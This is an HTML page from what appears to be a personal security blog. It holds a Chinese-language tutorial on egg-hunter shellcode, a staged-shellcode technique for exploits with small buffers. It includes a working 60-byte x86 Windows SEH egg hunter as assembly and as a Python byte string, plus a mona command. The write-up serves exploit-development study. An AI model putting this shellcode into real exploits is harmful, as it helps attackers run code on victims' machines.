@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Whatever is worth doing is worth doing well !">
+    <meta name="author" content="ssooking">
+    
+    <title>
+        
+            shellcode开发-Egg Hunter |
+        
+        ssooking&#39;s notebook
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"ssooking.github.io","root":"/","language":"en","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep moving!"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":3};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                ssooking&#39;s notebook
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">shellcode开发-Egg Hunter</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">ssooking</span>
+                        
+                            <span class="author-label">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2020-01-26 21:26:00</span>
+        <span class="mobile">2020-01-26 21:26</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Pwn/">Pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/shellcode/">shellcode</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/egg-hunter/">egg-hunter</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Egg hunter是一种shellcode利用技术，它可以归类到<a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Shellcode#Staged_shellcode" >Staged shellcode<i class="fas fa-external-link-alt"></i></a>中，即分段执行shellcode。当劫持了程序的执行流程，但是缓冲区太小而无法存储攻击载荷时，可以使用这种技术。Egg hunter的思想是：把较大的shellcode放到内存的其他足够空间里，然后在易受攻击但空间较小的缓冲区内，只存放一段小shellcode执行。这个小shellcode的功能是搜索并执行内存中的大shellcode。这就类似于Web安全中利用小马上传大马。</p>
+<p>在这个过程中，有两个重要的角色：</p>
+<ul>
+<li>Hunter：一段shellcode代码，用于从内存中搜索大shellcode位置，执行大shellcode</li>
+<li>Egg：一个特殊的字符串标志，在搜索时能够让我们定位大shellcode的位置。</li>
+</ul>
+<p>Egg的值通常由一个4位的字符串Tag拼接两次而来。比如Tag为<code>ssoo</code>，则Egg就是<code>ssoossoo</code>，这样标记足够独特，避免搜索时搜到的是其他内存中的数据。在开发shellcode时，我们设置Tag就行。</p>
+<p>但是如何从内存中搜索呢？想深入了解原理可以读一下这篇文章《<a class="link"   target="_blank" rel="noopener" href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf" >Safetly Searching Process Virtual Address Space<i class="fas fa-external-link-alt"></i></a>》。内存扫描时，会从内存0x00处通过递增地址依次访问内存，当出现无法访问的地址时会由一些判断逻辑或者策略进行处理，防止程序崩溃。操作系统提供了一些系统调用，用来判断内存区域是否有效，如果遇到无效的内存地址，大多数系统调用会返回EFAULT。常见系统调用：</p>
+<ul>
+<li>Linux：access(2) 、access(2) revisited、sigaction(2)</li>
+<li>Windows：IsBadReadPtr、NtDisplayString、NTAccessCheckAndAuditAlarm、SEH</li>
+</ul>
+<p>egg hunter流程图如下所示：</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/pwn/2020127125023.png" alt="2020127125023"></p>
+<p>egghunter<a class="link"   target="_blank" rel="noopener" href="https://www.fuzzysecurity.com/tutorials/expDev/4.html" >利用条件<i class="fas fa-external-link-alt"></i></a>：</p>
+<p>（1）覆盖EIP之前的缓冲区空间也位于内存中的某个位置，并且</p>
+<p>（2）缓冲区段也可能存储在完全不同的内存区域中。如果其他缓冲区空间近在咫尺，您可以通过“跳转到偏移量”到达那里</p>
+<p>（3）搜索标记</p>
+<p>hunter代码也可能会出现坏字符，需要注意</p>
+<p>各种类型的egghunter的大小情况如下：</p>
+<table>
+<thead>
+<tr>
+<th><strong>Linux</strong></th>
+<th>access(2)</th>
+<th>sigaction(2)</th>
+<th>access(2) revisited</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Size</td>
+<td>39</td>
+<td>30</td>
+<td>35</td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Windows</strong></td>
+<td><strong>IsBadReadPtr</strong></td>
+<td><strong>NtDisplayString</strong></td>
+<td><strong>NTAccessCheckAndAuditAlarm</strong></td>
+<td><strong>SEH</strong></td>
+</tr>
+<tr>
+<td>Size</td>
+<td>37</td>
+<td>32</td>
+<td>32</td>
+<td>60</td>
+</tr>
+</tbody></table>
+<h1 id="SEH-egghunter"><a href="#SEH-egghunter" class="headerlink" title="SEH egghunter"></a>SEH egghunter</h1><p><a class="link"   target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/structured-exception-handling-c-cpp?view=vs-2019" >SEH (Structured Exception Handling) <i class="fas fa-external-link-alt"></i></a>，结构化异常处理，使用SEH时如果程序抛出异常，可以响应或消除该异常。在egg hunter中，可以使用SEH来处理访问到非法地址时的异常。下面就用SEH方式来实现egg hunter。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">EB21       					jmp short 0x23</span><br><span class="line">59         					pop ecx</span><br><span class="line">B873736f6f				  mov eax,0x73736f6f	; tag ssoo 73736f6f</span><br><span class="line">51         					push ecx</span><br><span class="line">6AFF       					push byte -0x1</span><br><span class="line">33DB       					xor ebx,ebx</span><br><span class="line">648923     					mov [fs:ebx],esp</span><br><span class="line">6A02       					push byte +0x2</span><br><span class="line">59         					pop ecx</span><br><span class="line">8BFB      				  mov edi,ebx</span><br><span class="line">F3AF       					repe scasd</span><br><span class="line">7507       					jnz 0x20</span><br><span class="line">FFE7       					jmp edi</span><br><span class="line">6681CBFF0F 					or bx,0xfff</span><br><span class="line">43         					inc ebx</span><br><span class="line">EBED       					jmp short 0x10</span><br><span class="line">E8DAFFFFFF 					call 0x2</span><br><span class="line">6A0C       					push byte +0xc</span><br><span class="line">59         					pop ecx</span><br><span class="line">8B040C     					mov eax,[esp+ecx]</span><br><span class="line">B1B8       					mov cl,0xb8</span><br><span class="line">83040806   					add dword [eax+ecx],byte +0x6</span><br><span class="line">58         					pop eax</span><br><span class="line">83C410     					add esp,byte+0x10</span><br><span class="line">50         					push eax</span><br><span class="line">33C0       					xor eax,eax</span><br><span class="line">C3         					ret</span><br></pre></td></tr></table></figure>
+
+<p>hunter</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hunter = (</span><br><span class="line"><span class="string">&quot;\xeb\x21\x59\xb8&quot;</span></span><br><span class="line"><span class="string">&quot;ssoo&quot;</span>		<span class="comment">#tag ssoo =&gt; \x73\x73\x6F\x6F</span></span><br><span class="line"><span class="string">&quot;\x51\x6a\xff\x33\xdb\x64\x89\x23\x6a\x02\x59\x8b\xfb&quot;</span></span><br><span class="line"><span class="string">&quot;\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb&quot;</span></span><br><span class="line"><span class="string">&quot;\xed\xe8\xda\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1&quot;</span></span><br><span class="line"><span class="string">&quot;\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x33\xc0\xc3&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>SEH实现的egghunter中，hunter的大小为60字节。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona egg -t w00t</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="egghunter问题"><a href="#egghunter问题" class="headerlink" title="egghunter问题"></a>egghunter问题</h1><p>遇到坏字符怎么办？</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.fuzzysecurity.com/tutorials/expDev/4.html" >https://www.fuzzysecurity.com/tutorials/expDev/4.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://armoredcode.com/blog/a-closer-look-to-msf-egghunter/" >https://armoredcode.com/blog/a-closer-look-to-msf-egghunter/<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a class="link"   target="_blank" rel="noopener" href="https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/" >https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.zzz4ck.com/blog/2019/06/30/egg_hunter_SEH/" >https://www.zzz4ck.com/blog/2019/06/30/egg_hunter_SEH/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.fuzzysecurity.com/tutorials/expDev/4.html" >https://www.fuzzysecurity.com/tutorials/expDev/4.html<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：shellcode开发-Egg Hunter</li>
+        <li>Post author：ssooking</li>
+        <li>Create time：2020-01-26 21:26:00</li>
+        <li>
+            Post link：https://ssooking.github.io/2020/01/shellcode开发-egg-hunter/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/shellcode/">#shellcode</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/egg-hunter/">#egg-hunter</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2020/03/hackthebox%E5%85%A5%E9%97%A8/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">HackTheBox入门</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2020/01/binary-to-shellcode/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">binary to shellcode</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>
+              -
+            
+            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">ssooking</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SEH-egghunter"><span class="nav-number">2.</span> <span class="nav-text">SEH egghunter</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#egghunter%E9%97%AE%E9%A2%98"><span class="nav-number">3.</span> <span class="nav-text">egghunter问题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
